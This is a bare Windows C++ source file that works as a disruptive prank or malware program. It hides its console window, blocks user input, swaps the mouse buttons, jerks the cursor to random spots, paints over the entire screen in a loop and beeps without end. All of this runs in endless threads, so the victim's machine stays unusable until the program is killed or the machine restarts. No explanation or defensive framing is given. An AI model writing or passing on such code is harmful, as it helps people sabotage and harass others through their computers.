#include <Windows.h>
#include <thread>
#include <random>

int getRandomNumber(int min, int max) {
    std::mt19937 mt{ std::random_device{}() };

    return std::uniform_int_distribution<int>{ min, max }(mt);
}

void f1() {
    int x, y;

    SwapMouseButton(TRUE);
    while (true) {
        Sleep(40);
        x = getRandomNumber(1, GetSystemMetrics(SM_CXSCREEN));
        y = getRandomNumber(1, GetSystemMetrics(SM_CYSCREEN));

        SetCursorPos(x, y);
    }
}

void f2() {
    while (true) {
        Rectangle(GetDC(NULL), 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
    }
}

void f3() {
    while (true) {
        Beep(750, 300);
    }
}

int main() {
    FreeConsole();
    BlockInput(TRUE);

    std::thread(f1).detach();
    std::thread(f2).detach();
    std::thread(f3).detach();

    Sleep(INFINITE);

    return 0;
}
